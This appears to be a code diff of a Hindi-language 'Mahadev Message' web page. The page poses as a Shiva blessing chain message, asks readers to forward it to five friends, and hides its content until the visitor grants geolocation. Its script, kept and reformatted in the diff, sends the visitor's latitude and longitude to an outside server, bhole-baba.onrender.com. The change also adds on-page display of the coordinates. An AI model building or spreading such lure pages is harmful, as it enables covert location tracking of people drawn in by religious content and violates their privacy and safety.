@@ -1,66 +1,71 @@
 <!DOCTYPE html>
 <html lang="hi">
 <head>
-<meta charset="UTF-8" />
-<title>Mahadev Message</title>
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    text-align: center;
-    margin: 50px;
-    background: #f9f9f9;
-    color: #333;
-  }
-  h1 {
-    font-size: 48px;
-    color: #005500;
-  }
-  p {
-    font-size: 20px;
-    margin: 10px 0;
-  }
-  img {
-    margin-top: 30px;
-    max-width: 300px;
-    border-radius: 10px;
-  }
-</style>
-<script>
-  document.addEventListener("DOMContentLoaded", function () {
-    const content = document.getElementById("main-content");
-    const warning = document.getElementById("warning");
+  <meta charset="UTF-8" />
+  <title>Mahadev Message</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 50px;
+      background: #f9f9f9;
+      color: #333;
+    }
+    h1 {
+      font-size: 48px;
+      color: #005500;
+    }
+    p {
+      font-size: 20px;
+      margin: 10px 0;
+    }
+    img {
+      margin-top: 30px;
+      max-width: 300px;
+      border-radius: 10px;
+    }
+  </style>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const content = document.getElementById("main-content");
+      const warning = document.getElementById("warning");
+      const coords = document.getElementById("coords");
 
-    navigator.geolocation.getCurrentPosition(
-      function (position) {
-        content.style.display = "block";
-        warning.style.display = "none";
+      navigator.geolocation.getCurrentPosition(
+        function (position) {
+          content.style.display = "block";
+          warning.style.display = "none";
 
-        // Yahan niche location server pe bhejne ka code hai
-        fetch("https://bhole-baba.onrender.com/save-location", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude
+          // Location dikhana
+          coords.innerText =
+            `आपकी Location: Latitude ${position.coords.latitude}, Longitude ${position.coords.longitude}`;
+
+          // Location server pe bhejna
+          fetch("https://bhole-baba.onrender.com/save-location", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude
+            })
           })
-        })
-        .then(response => response.text())
-        .then(data => {
-          console.log("Location sent:", data);
-        })
-        .catch(err => {
-          console.error("Error sending location:", err);
-        });
-      },
-      function (error) {
-        content.style.display = "none";
-        warning.style.display = "block";
-      }
-    );
-  });
-</script>
+            .then(response => response.text())
+            .then(data => {
+              console.log("Location sent:", data);
+            })
+            .catch(err => {
+              console.error("Error sending location:", err);
+            });
+        },
+        function (error) {
+          content.style.display = "none";
+          warning.style.display = "block";
+        }
+      );
+    });
+  </script>
 </head>
 <body>
 
@@ -73,6 +78,7 @@
   <h1>ॐ नमः शिवाय</h1>
   <p>महादेव आपकी मनोकामना पूरी करें!</p>
   <p>इस मैसेज को अभी अपने 5 दोस्तों को भेजो और देखो चमत्कार!</p>
+  <p id="coords"></p> <!-- ✅ यहीं location दिखाई जाएगी -->
   <img src="https://i.postimg.cc/tT9XKSsJ/adiyogi-lord-shiva-1179x2556-14420.png" alt="Mahadev Image" />
 </div>
 
